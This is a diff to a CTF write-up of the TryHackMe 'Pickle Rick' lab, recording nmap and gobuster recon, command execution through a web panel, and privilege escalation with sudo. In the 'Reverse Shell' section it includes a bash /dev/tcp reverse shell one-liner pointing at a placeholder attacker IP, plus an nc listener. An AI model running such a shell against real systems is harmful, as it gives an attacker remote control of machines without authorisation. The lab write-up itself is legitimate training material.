@@ -1,5 +1,6 @@
 Writeup for TryHackMe CTF Pickle Rick
 
+# Recon
 The first step I scanned ports with nmap. As a result, two open ports were found.
 ```
 nmap -sS -sV 10.114.186.45
@@ -51,6 +52,7 @@ Starting gobuster in directory enumeration mode
 /portal.php           (Status: 302) [Size: 0] [--> /login.php]
 /robots.txt           (Status: 200) [Size: 17]
 ```
+# Exploitation
 I checked the `login.php` page. 
 
 ![](./screenshots/4.png)
@@ -69,6 +71,7 @@ I tried entering some commands and received information that my workind director
 ![](./screenshots/6.png)
 
 The `cat` command didn't work. So i remebered the tip from the very beginning: need to use a reverse shell.
+# Reverse Shell & Read the Flags
 At first, I wanted to use Metasploit, but later realized it wasn't necessary. So I used Netcat (`nc -lvnp 4444`) on the attack machine and bash in the Command Panel (`bash -c 'exec bash -i &>/dev/tcp/ATTACK_IP/4444 <&1`). After establishing a connection, I was able to read the file and find the first ingredient.
 
 ![](./screenshots/8.png)
@@ -81,7 +84,7 @@ Well, I continued to look around the file system.
 I looked in the `/home/rick` and found the second ingredient there.
 ![](./screenshots/10.png) ![](./screenshots/11.png)
 
-While searching, I discovered i didn't have sufficient rights to access the `root` folder. But this wasn't a big problem, and I was able to easily find the third ingredient there.
+While searching, I discovered i didn't have sufficient rights to access the `root` folder. But this wasn't a big problem, and I was able to easily find the third ingredient there with `sudo su` command.
 ![](./screenshots/12.png) ![](./screenshots/13.png)
 
 And with that, the 20-minute adventure is over.
